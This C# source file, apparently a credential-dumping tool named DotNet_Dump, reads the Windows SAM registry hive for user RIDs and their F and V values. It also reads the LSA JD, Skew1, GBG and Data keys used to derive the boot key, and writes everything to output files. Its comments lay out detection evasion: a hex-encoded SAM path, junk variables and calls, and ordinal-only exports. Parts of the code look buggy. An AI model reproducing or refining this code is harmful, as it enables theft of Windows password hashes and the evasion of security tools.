using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;


// could export a bunch of different functions that do nothing ---> TODO
// export without name; only export ordinal ---> TODO
// use useless parameters
// dont store any important hard coded stirngs; get them from the environment
// useless checks and function calls 
// useless namespaces referrenced 


namespace DotNet_Dump
{
    public partial class Program
    {
        // Use PInvoke to call unmanaged Windwos libraries from this app
        [DllImport("Advapi32.dll", SetLastError = true)]
        static extern int RegQueryInfoKeyA();



        static void Main(string[] args)
        {
            execute();
        }

        /* Main execution point
         * Input:
         *      N/A
         * Return:
         *      N/A
         * */
        static void execute()
        {
            int status = 0, uselessVar1 = 0x22501984;
            string key, uselessVar2 = "AC1599DEFFBAB3A5CDDD";
            string[] userRids, userValues, bootKeyValues;

            Debug.WriteLine("Generating key...");

            // Generate our key; continue to use and modify this key so we dont hard code it 
            key = genKey(uselessVar1, uselessVar2);
            if (key != null)
            {
                if (Environment.Is64BitProcess)
                {
                    status = 1 - 1;
                }
                else
                {
                    if (Environment.Is64BitOperatingSystem)
                    {
                        status = uselessVar1 - 0x22501984;
                    }
                }
            }

            Debug.WriteLine("Grabbing user info...");

            // Grab all our user info
            status = grabUserInfo(key, out userRids, out userValues);

            Debug.WriteLine("Grabbing boot key values...");

            // Grab the info we need for our bootkey
            getBootKeyValues(out bootKeyValues);

            Debug.WriteLine("Dumping info...");

            // Dump all our info to an output file
            dumpInfo(bootKeyValues, userRids, userValues);

            return;
        }

        /* Generate the base key to list our users 
         * Input:
         *      uselessVar1 - useless :)
         *      uselessVar2 - useless :)
         * Return:
         *      The translated stirng key to our users on target
         * */
        static string genKey(in int uselessVar1, in string uselessVar2)
        {
            string key = "";
            // SAM\SAM\Domains\Account\Users
            //string users = "43 6f 6d 70 75 74 65 72 5c 48 4b 45 59 5f 4c 4f 43 41 4c 5f 4d 41 43 48 49 4e 45 5c 53 41 4d 5c 53 41 4d 5c 44 6f 6d 61 69 6e 73 5c 41 63 63 6f 75 6e 74 5c 55 73 65 72 73";
            string users = "53 41 4D 5C 53 41 4D 5C 44 6F 6D 61 69 6E 73 5C 41 63 63 6F 75 6E 74 5C 55 73 65 72 73";
            string[] userBytes = users.Split(' ');

            //Debug.WriteLine(" user bytes is " + userBytes);

            // Translate
            foreach (string hex in userBytes)
            {
                int value = Convert.ToInt32(hex, 16);

                //Debug.WriteLine("char value is " + (char)value);

                string stringValue = Char.ConvertFromUtf32(value);

                key += (char)value;
            }

            Debug.WriteLine("registry key is " + key);
                              
            RegistryKey openKey = Registry.LocalMachine.OpenSubKey(key);
           
            return key;
        }

        /* Grab user RIDs + their F values
         * Input:
         *      uselessVar1 - useless :)
         *      uselessVar2 - useless :)
         * Return:
         *      The translated stirng key to our users on target
         * */
        static int grabUserInfo(in string key, out string[] userRids, out string[] userValues)
        {
            int status = 1, numUsers = 0;
            RegistryKey users;
            int index = 0;

            // Open base users key
            users = Registry.LocalMachine.OpenSubKey(key);
            if (users == null)
            {
                Debug.WriteLine("Failed to open users key");
            }

            numUsers = users.SubKeyCount - 1; // dont include names

            userRids = new string[numUsers];

            userValues = new string[numUsers];

            Debug.WriteLine("There are " + numUsers.ToString() + " users");

            foreach (string user in users.GetSubKeyNames())
            {
                if (user != "Names")
                {
                    RegistryKey currUser = users.OpenSubKey(user);
                    if (currUser == null)
                    {
                        Debug.WriteLine("Failed to open user sub key" + user);
                    }

                    else
                    {
                        Debug.WriteLine("user rid is " + user);
                    }

                    //userRids.Append(currUser.Name);
                    //userRids[index] = currUser.Name;
                    userRids[index] = user;

                    byte[] fValue = (byte[]) currUser.GetValue("V");

                    //Debug.WriteLine("bytes are " + fValue.ToString());
                    //Debug.WriteLine("type is " + fValue.GetType()); // byte[]

                    Debug.WriteLine("converted is " + System.Text.Encoding.UTF8.GetString(fValue));

                    //userValues.Append(currUser.GetValue("F"));          
                    userValues[index] = currUser.GetValue("F").ToString(); // maybe bytes cast?

                    currUser.Close();

                    index++;
                }

                else
                {
                    continue;
                }
            }

            users.Close();

            return status;
        }


        // Get registry key class information through reflection
            // .NET does not expose APIs that allow us to get class information...







        /* Grab the bootkey (really just the JD, Skew1, GBG, and Data keys from LSA; we do the calculation later...)
         * Input:
         *      bootKeyValues - JD, Skew1, GBG and Data keys we need for the bootkey 
         * Return:
         *      N/A
         * */
        static void getBootKeyValues(out string[] bootKeyValues)
        {
            RegistryKey bootKeyPath = Registry.LocalMachine;
            string[] keys = {"JD", "Skew1", "GBG", "Data"};
            string path = "SYSTEM\\CurrentControlSet\\Control\\Lsa\\";
            int index = 0;

            bootKeyValues = new string[keys.Length];

            foreach (string key in keys)
            {
                string updatedPath = path + key;

                RegistryKey fullBootPath = bootKeyPath.OpenSubKey(updatedPath);
                if (fullBootPath == null)
                {
                    Debug.WriteLine("failed to open full boot key path " + updatedPath);
                }

                Object obj = fullBootPath.GetValue("");
                if (obj == null)
                {
                    Debug.WriteLine("object is null! at " + fullBootPath.Name);

                }


                bootKeyValues.Append(fullBootPath.GetValue("")); // default value for this key 
                //bootKeyValues[index] = fullBootPath.GetValue("").ToString();

                index++;
            }

            return;
        }

        /* Dump all info to appropiate output files
         * Input:
         *      bootKeyValues - JD, Skew1, GBG and Data keys we need for the bootkey 
         * Return:
         *      N/A
         * */
        static void dumpInfo(in string[] bootKeyValues, in string[] userRids, in string[] userValues)
        {
            string dirName = "\\out";
            DirectoryInfo di;
            int index = 0;

            Debug.WriteLine("Creating dir...");

            // Make a dir for all the files
            di = Directory.CreateDirectory(Directory.GetCurrentDirectory() +  dirName);

            Debug.WriteLine("dirname is " +  di.Name);

            // Each filename will be a user RID
            foreach (string userRid in userRids)
            {

                Debug.WriteLine("full path is " +  Directory.GetCurrentDirectory() + dirName + "\\" + userRid + ".txt");

                // Name may be wrong here, probably need full path 
                using (StreamWriter outputFile = new StreamWriter(Directory.GetCurrentDirectory() + dirName + "\\" + userRid + ".txt"))
                {
                    outputFile.WriteLine(userValues[index]); // their F key
                    index++;
                }
            }

            Debug.WriteLine("full path for bootkey is " +  Directory.GetCurrentDirectory() + dirName + "\\" + "key" + ".txt");

            // Separate file for the bootkey info 
            using (StreamWriter bootKeyFile = new StreamWriter(Directory.GetCurrentDirectory() + dirName + "\\" + "key" + ".txt"))
            {
                foreach (string key in bootKeyValues)
                {
                    bootKeyFile.WriteLine(key);
                }
            }

            return;
        }


        // Add random functions that do nothing ?





    }
}
